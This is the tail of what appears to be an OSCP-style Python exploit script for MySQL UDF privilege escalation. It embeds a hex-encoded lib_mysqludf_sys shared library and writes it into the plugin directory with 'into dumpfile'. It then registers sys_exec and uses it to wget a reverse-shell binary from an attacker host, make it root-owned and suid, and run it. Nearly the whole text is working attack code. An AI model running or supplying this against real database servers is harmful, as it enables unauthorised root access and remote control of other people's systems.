0000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000";

shellcode = shellcode_x32
#if (platform.architecture()[0] == '64bit'):
# shellcode = shellcode_x64

# MySQL username and password: make sure you have FILE privileges and mysql is actually running as root
# username='root'
# password=''

###
#if len(sys.argv) != 2:
#	print "Usage: %s <username> <password>" % argv[0]

#username=sys.argv[1];
#password=sys.argv[2];
###

parser = argparse.ArgumentParser()
parser.add_argument('--username', '-u', help='MySQL username', type=str, required=True)
parser.add_argument('--password', '-p', help='MySQL password', type=str)

args = parser.parse_args()

username=args.username
password=args.password

if not password:
	password=''

cmd='mysql --protocol=tcp -u root -p\'' + password + '\' -e "select @@plugin_dir \G"'
plugin_str = subprocess.check_output(cmd, shell=True)
plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
res = bool(plugin_dir)

if not res:
 print "Error: could not locate the plugin directory"
 sys.exit(1);

plugin_dir_ = plugin_dir.group(1)

print "Plugin dir is %s" % plugin_dir_

# file to save the udf so file to
# udf_filename = 'udf' + str(random.randint(1000,10000)) + '.so'
udf_filename = 'udf_sys_exec.so'
udf_outfile = plugin_dir_ + udf_filename

# alternative way:
# set @outputpath := @@plugin_dir; set @outputpath := @@plugin_dir;

print "Trying to create a udf library...";
os.system('mysql --protocol=tcp -u root -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
# Since we're executing this remotely, remove this system checks then rig it to pass.  We may want the logic again later
#res = os.path.isfile(udf_outfile)
res = '11'

if not res:
 print "Error: could not create udf file in %s (mysql is either not running as root or may be file exists?)" % udf_outfile
 sys.exit(1);

print "UDF library crated successfully: %s" % udf_outfile;
print "Trying to create sys_exec..."
os.system('mysql --protocol=tcp -u root -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)

print "Checking if sys_exec was crated..."
cmd='mysql --protocol=tcp -u root -p\'' + password + '\' -e "select * from mysql.func where name=\'sys_exec\' \G"';
res = subprocess.check_output(cmd, shell=True);

if (res == ''):
	print "sys_exec was not found (good luck next time!)"

if res:
	print "sys_exec was found: %s" % res
	print "Generating a suid binary in /tmp/rsh..."
	os.system('mysql --protocol=tcp -u root -p\'' + password + '\' -e "select sys_exec(\'wget http://192.168.119.211/rsh/oscp/rsh443.elf -O /tmp/rsh; chown root:root /tmp/rsh; chmod +s /tmp/rsh; /tmp/rsh &\')"')

## We're executing remotely, this doesn't work.
#	print "Trying to spawn a root shell..."
#	pty.spawn("/tmp/sh");
